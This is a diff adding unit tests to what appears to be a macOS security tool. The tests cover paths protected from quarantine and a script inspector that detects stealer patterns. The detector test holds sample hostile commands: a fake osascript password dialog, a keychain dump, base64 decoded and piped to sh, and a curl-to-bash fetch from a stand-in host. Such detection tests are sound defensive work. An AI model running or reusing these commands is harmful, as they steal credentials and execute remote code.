@@ -15,6 +15,26 @@ class OwnItemTest(unittest.TestCase):
         self.assertFalse(security.is_own_item("com.evil.x", "/tmp/x"))
         self.assertFalse(security.is_own_item("com.alptug.mek.ui", "/tmp/x"))
 
+    def test_creative_plugin_dirs_are_protected_from_quarantine(self):
+        for p in (
+            "/Applications/Adobe Premiere Pro 2026/Adobe Premiere Pro 2026.app/Contents/MacOS/Adobe Premiere Pro 2026",
+            "/Library/Application Support/Adobe/Common/Plug-ins/7.0/MediaCore/Universe.plugin",
+            "/Library/OFX/Plugins/Dehancer.ofx.bundle",
+            "/Library/Audio/Plug-Ins/VST3/FabFilter Pro-Q 3.vst3",
+        ):
+            self.assertTrue(p.startswith(security.PROTECTED), msg=f"Path should be protected: {p}")
+
+    def test_stealer_and_shell_injection_detection(self):
+        self.assertIsNotNone(security.inspect_script_text(
+            'osascript -e \'display dialog "System Preferences requires your password" default answer "" with hidden answer\''
+        ))
+        self.assertIsNotNone(security.inspect_script_text("security dump-keychain -d login.keychain"))
+        self.assertIsNotNone(security.inspect_script_text("echo aGVsbG8= | base64 -D | sh"))
+        self.assertIsNotNone(security.inspect_script_text("curl -fsSL https://evil.example/p.sh | bash"))
+        # Normal macOS bildirimleri stealer sayılmaz:
+        self.assertIsNone(security.inspect_script_text('osascript -e \'display notification "Render bitti" with title "Mek"\''))
+        self.assertIsNone(security.inspect_script_text("export PATH=/opt/homebrew/bin:$PATH"))
+
 
 if __name__ == "__main__":
     unittest.main()
